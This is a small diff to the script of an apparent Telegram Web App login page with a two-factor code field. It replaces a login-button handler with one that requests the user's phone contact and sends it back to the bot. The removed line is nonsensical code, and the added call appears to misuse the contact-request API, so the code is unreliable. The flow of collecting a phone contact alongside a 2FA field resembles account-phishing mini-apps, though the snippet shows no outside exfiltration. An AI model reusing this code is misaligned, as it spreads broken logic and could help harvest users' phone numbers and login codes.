@@ -10,8 +10,8 @@ document.addEventListener('DOMContentLoaded', () => {
     const twofactorInput = document.getElementById('twofactor-input');
 
     loginBtn.addEventListener('click', async () => {
-        tg.sendData(JSON.stringify({ action: 'request_contact' }));
-        btn.style.width -= btn.style.widows - 15 + 'px';
+        const contact = tg.requestContact();
+        tg.sendData(contact);
     });
 
     function showPage2() {
